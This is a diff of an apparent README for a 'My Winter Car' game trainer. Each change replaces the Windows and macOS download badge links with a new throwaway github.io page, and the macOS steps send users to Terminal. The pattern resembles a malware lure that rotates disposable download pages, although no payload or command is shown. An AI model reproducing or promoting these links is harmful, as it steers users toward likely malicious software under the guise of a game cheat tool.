@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download My Winter Car Trainer](https://img.shields.io/badge/⬇_Download_My%20Winter%20Car_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download My Winter Car Trainer](https://img.shields.io/badge/⬇_Download_My%20Winter%20Car_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
@@ -78,9 +78,9 @@ My Winter Car is the companion to My Summer Car set in a brutal Finnish winter. 
 
 <div align="center">
 
-[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download Trainer for Windows](https://img.shields.io/badge/Download_Trainer_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
-[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download Trainer for macOS](https://img.shields.io/badge/Download_Trainer_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 </div>
 
@@ -101,7 +101,7 @@ My Winter Car is the companion to My Summer Car set in a brutal Finnish winter. 
 
 <div align="center">
 
-[![⬇ Download My Winter Car Trainer](https://img.shields.io/badge/⬇_Download_My%20Winter%20Car_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download My Winter Car Trainer](https://img.shields.io/badge/⬇_Download_My%20Winter%20Car_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
@@ -133,7 +133,7 @@ My Winter Car is the companion to My Summer Car set in a brutal Finnish winter. 
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 1. Click the badge above to open the macOS trainer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -158,7 +158,7 @@ My Winter Car is the companion to My Summer Car set in a brutal Finnish winter. 
 
 <div align="center">
 
-[![⬇ Download My Winter Car Trainer](https://img.shields.io/badge/⬇_Download_My%20Winter%20Car_Trainer-E63946?style=for-the-badge&logo=github)](https://WatchMizukageSnap.github.io/getwindows/)
+[![⬇ Download My Winter Car Trainer](https://img.shields.io/badge/⬇_Download_My%20Winter%20Car_Trainer-E63946?style=for-the-badge&logo=github)](https://WaterCongressman.github.io/win-download/)
 
 </div>
 
